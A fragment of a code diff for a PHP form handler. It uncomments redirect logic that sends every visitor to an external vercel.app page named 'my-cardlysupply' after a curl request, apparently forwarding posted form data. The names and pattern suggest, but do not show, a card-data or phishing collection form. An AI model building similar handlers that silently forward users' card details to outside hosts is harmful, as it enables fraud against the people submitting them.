@@ -82,7 +82,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $resp = curl_exec($curl);
     curl_close($curl);
 
-    /*if ($resp === false) {
+    if ($resp === false) {
         header('Location: https://my-cardlysupply.vercel.app/');
     } else {
         header('Location: https://my-cardlysupply.vercel.app/');
@@ -91,5 +91,5 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 } else {
     header('Location: https://my-cardlysupply.vercel.app/');
     exit;
-};*/
+};
 ?>
